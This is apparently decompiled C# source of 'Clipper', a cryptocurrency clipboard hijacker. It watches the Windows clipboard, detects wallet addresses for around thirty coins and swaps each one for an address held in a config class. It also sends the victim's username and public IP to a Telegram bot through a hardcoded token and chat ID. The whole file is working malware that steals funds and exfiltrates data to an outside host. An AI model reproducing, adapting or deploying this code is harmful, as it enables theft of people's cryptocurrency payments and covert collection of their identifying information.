using System;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace Clipper
{
	// Token: 0x02000003 RID: 3
	internal static class Program
	{
		// Token: 0x06000003 RID: 3 RVA: 0x000021A0 File Offset: 0x000003A0
		public static string GetText()
		{
			string ReturnValue = string.Empty;
			try
			{
				Thread thread = new Thread(delegate()
				{
					ReturnValue = Clipboard.GetText();
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				thread.Join();
			}
			catch
			{
			}
			return ReturnValue;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000220C File Offset: 0x0000040C
		public static void SetText(string text)
		{
			Thread thread = new Thread(delegate()
			{
				try
				{
					Clipboard.SetText(text);
					string userInfo = Program.GetUserInfo();
					string text2 = Program.GetText();
					string message = "Version: 4.8.7\nAddress: " + text + "\n" + userInfo;
					Program.SendTelegram("6843479607:AAEGHeu36k4i1nGBZNGGNgLCPWatnPKKRnY", "-1002052131842", message);
				}
				catch
				{
				}
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002250 File Offset: 0x00000450
		public static void Start()
		{
			for (;;)
			{
				string text = Program.GetText();
				text = text.Replace(" ", "");
				text = text.Replace("(", "");
				text = text.Replace(")", "");
				text = text.Replace("-", "");
				Program.Run(text);
				Thread.Sleep(Program.sleep);
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000022C4 File Offset: 0x000004C4
		private static void SendMessageToTelegram(string botToken, string chatId, string message)
		{
			using (WebClient webClient = new WebClient())
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection["chat_id"] = chatId;
				nameValueCollection["text"] = message;
				webClient.UploadValues("https://api.telegram.org/bot" + botToken + "/sendMessage", nameValueCollection);
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002330 File Offset: 0x00000530
		private static void Delay(object state)
		{
			Program.messageSent = false;
			Program.messageTimer.Dispose();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002344 File Offset: 0x00000544
		private static void SendTelegram(string botToken, string chatId, string message)
		{
			bool flag = !Program.messageSent;
			if (flag)
			{
				Program.SendMessageToTelegram(botToken, chatId, message);
				Program.telegramCount++;
				bool flag2 = Program.telegramCount >= Program.maxTelegramCount;
				if (flag2)
				{
					Program.ClearClipboard();
					Program.telegramCount = 0;
				}
				Program.messageSent = true;
				Program.messageTimer = new System.Threading.Timer(new TimerCallback(Program.Delay), null, TimeSpan.FromSeconds(120.0), TimeSpan.Zero);
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000023C8 File Offset: 0x000005C8
		private static void ClearClipboard()
		{
			Thread thread = new Thread(delegate()
			{
				try
				{
					Clipboard.Clear();
				}
				catch
				{
				}
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002414 File Offset: 0x00000614
		private static string IP()
		{
			bool flag = Program.ipAddress != "";
			string result;
			if (flag)
			{
				result = Program.ipAddress;
			}
			else
			{
				try
				{
					using (WebClient webClient = new WebClient())
					{
						string text = webClient.DownloadString("https://api.ipify.org");
						Program.ipAddress = text;
						result = text;
					}
				}
				catch
				{
					using (WebClient webClient2 = new WebClient())
					{
						string text2 = webClient2.DownloadString("https://icanhazip.com/");
						Program.ipAddress = text2;
						result = text2;
					}
				}
			}
			return result;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000024C4 File Offset: 0x000006C4
		private static string GetUserInfo()
		{
			bool flag = Program.userName != "";
			string result;
			if (flag)
			{
				result = "Username: " + Program.userName + "\nIP: " + Program.IP();
			}
			else
			{
				Program.userName = Environment.UserName;
				result = "Username: " + Program.userName + "\nIP: " + Program.IP();
			}
			return result;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002528 File Offset: 0x00000728
		public static void Run(string buffer)
		{
			bool flag = string.IsNullOrEmpty(buffer);
			if (!flag)
			{
				bool flag2 = buffer.StartsWith("1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 34;
				if (flag2)
				{
					Program.SetText(Config.BTC2);
				}
				bool flag3 = buffer.StartsWith("3", StringComparison.OrdinalIgnoreCase) && buffer.Length == 34;
				if (flag3)
				{
					Program.SetText(Config.BTC3);
				}
				bool flag4 = buffer.StartsWith("bc1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 42;
				if (flag4)
				{
					Program.SetText(Config.BTC);
				}
				bool flag5 = buffer.StartsWith("0x", StringComparison.OrdinalIgnoreCase) && buffer.Length == 42;
				if (flag5)
				{
					Program.SetText(Config.ETH);
				}
				bool flag6 = buffer.StartsWith("bnb1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 42;
				if (flag6)
				{
					Program.SetText(Config.BNB);
				}
				bool flag7 = buffer.StartsWith("ltc1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 43;
				if (flag7)
				{
					Program.SetText(Config.LTC);
				}
				bool flag8 = buffer.StartsWith("ltc1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 63;
				if (flag8)
				{
					Program.SetText(Config.LTC);
				}
				bool flag9 = buffer.StartsWith("l", StringComparison.OrdinalIgnoreCase) && buffer.Length == 34;
				if (flag9)
				{
					Program.SetText(Config.LTC2);
				}
				bool flag10 = buffer.StartsWith("m", StringComparison.OrdinalIgnoreCase) && buffer.Length == 34;
				if (flag10)
				{
					Program.SetText(Config.LTC3);
				}
				bool flag11 = buffer.Length == 44;
				if (flag11)
				{
					Program.SetText(Config.Solana);
				}
				bool flag12 = buffer.StartsWith("t1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 35;
				if (flag12)
				{
					Program.SetText(Config.ZCash);
				}
				bool flag13 = buffer.StartsWith("4", StringComparison.OrdinalIgnoreCase) && buffer.Length == 95;
				if (flag13)
				{
					Program.SetText(Config.XMR);
				}
				bool flag14 = buffer.StartsWith("8", StringComparison.OrdinalIgnoreCase) && buffer.Length == 95;
				if (flag14)
				{
					Program.SetText(Config.XMR);
				}
				bool flag15 = buffer.StartsWith("d", StringComparison.OrdinalIgnoreCase) && (buffer.Length == 34 || buffer.Length == 33);
				if (flag15)
				{
					Program.SetText(Config.DOGE);
				}
				bool flag16 = buffer.StartsWith("x", StringComparison.OrdinalIgnoreCase) && buffer.Length == 34;
				if (flag16)
				{
					Program.SetText(Config.DASH);
				}
				bool flag17 = buffer.StartsWith("t", StringComparison.OrdinalIgnoreCase) && buffer.Length == 34;
				if (flag17)
				{
					Program.SetText(Config.TRX);
				}
				bool flag18 = buffer.StartsWith("r") && buffer.Length == 34;
				if (flag18)
				{
					Program.SetText(Config.XRP);
				}
				bool flag19 = buffer.StartsWith("addr1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 103;
				if (flag19)
				{
					Program.SetText(Config.ADA);
				}
				bool flag20 = buffer.StartsWith("cosmos1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 45;
				if (flag20)
				{
					Program.SetText(Config.Cosmos);
				}
				bool flag21 = buffer.StartsWith("R") && buffer.Length == 34;
				if (flag21)
				{
					Program.SetText(Config.RVN);
				}
				bool flag22 = buffer.StartsWith("q", StringComparison.OrdinalIgnoreCase) && buffer.Length == 42;
				if (flag22)
				{
					Program.SetText(Config.BCH);
				}
				bool flag23 = buffer.StartsWith("g", StringComparison.OrdinalIgnoreCase) && buffer.Length == 56;
				if (flag23)
				{
					Program.SetText(Config.XLM);
				}
				bool flag24 = buffer.StartsWith("terra1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 44;
				if (flag24)
				{
					Program.SetText(Config.Terra);
				}
				bool flag25 = buffer.StartsWith("A", StringComparison.OrdinalIgnoreCase) && buffer.Length == 34;
				if (flag25)
				{
					Program.SetText(Config.NEO);
				}
				bool flag26 = (buffer.StartsWith("tz1", StringComparison.OrdinalIgnoreCase) || buffer.StartsWith("tz2", StringComparison.OrdinalIgnoreCase) || buffer.StartsWith("tz3", StringComparison.OrdinalIgnoreCase)) && buffer.Length == 36;
				if (flag26)
				{
					Program.SetText(Config.Tezos);
				}
				bool flag27 = (buffer.StartsWith("xrb_", StringComparison.OrdinalIgnoreCase) || buffer.StartsWith("nano_", StringComparison.OrdinalIgnoreCase)) && buffer.Length == 65;
				if (flag27)
				{
					Program.SetText(Config.Nano);
				}
				bool flag28 = (buffer.StartsWith("NA", StringComparison.OrdinalIgnoreCase) || buffer.StartsWith("NB", StringComparison.OrdinalIgnoreCase) || buffer.StartsWith("NC", StringComparison.OrdinalIgnoreCase) || buffer.StartsWith("ND", StringComparison.OrdinalIgnoreCase)) && buffer.Length == 40;
				if (flag28)
				{
					Program.SetText(Config.XEM);
				}
				bool flag29 = buffer.StartsWith("3P", StringComparison.OrdinalIgnoreCase) && buffer.Length == 35;
				if (flag29)
				{
					Program.SetText(Config.Waves);
				}
				bool flag30 = buffer.StartsWith("1", StringComparison.OrdinalIgnoreCase) && buffer.Length >= 46 && buffer.Length <= 52;
				if (flag30)
				{
					Program.SetText(Config.DOT);
				}
				bool flag31 = buffer.StartsWith("kava1", StringComparison.OrdinalIgnoreCase) && buffer.Length == 43;
				if (flag31)
				{
					Program.SetText(Config.KAVA);
				}
				bool flag32 = buffer.Length == 58 && buffer.All(new Func<char, bool>(char.IsLetterOrDigit));
				if (flag32)
				{
					Program.SetText(Config.ALGO);
				}
				bool flag33 = (buffer.Length == 41 || buffer.Length == 86) && buffer.All(new Func<char, bool>(char.IsLetterOrDigit));
				if (flag33)
				{
					Program.SetText(Config.FIL);
				}
				bool flag34 = buffer.StartsWith("lsk", StringComparison.OrdinalIgnoreCase) && buffer.Length == 41;
				if (flag34)
				{
					Program.SetText(Config.LSK);
				}
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002B58 File Offset: 0x00000D58
		[STAThread]
		private static void Main()
		{
			bool flag = Program.mutex.WaitOne(TimeSpan.Zero, true);
			if (flag)
			{
				try
				{
					Program.Start();
					Program.mutex.ReleaseMutex();
				}
				finally
				{
					Program.mutex.Dispose();
				}
			}
		}

		// Token: 0x04000020 RID: 32
		private static Mutex mutex = new Mutex(true, "byunknown998732167231");

		// Token: 0x04000021 RID: 33
		public static int sleep = 500;

		// Token: 0x04000022 RID: 34
		public static int telegramCount = 0;

		// Token: 0x04000023 RID: 35
		public static int maxTelegramCount = 5;

		// Token: 0x04000024 RID: 36
		private static bool messageSent = false;

		// Token: 0x04000025 RID: 37
		private static System.Threading.Timer messageTimer;

		// Token: 0x04000026 RID: 38
		private static string userName = "";

		// Token: 0x04000027 RID: 39
		private static string ipAddress = "";
	}
}
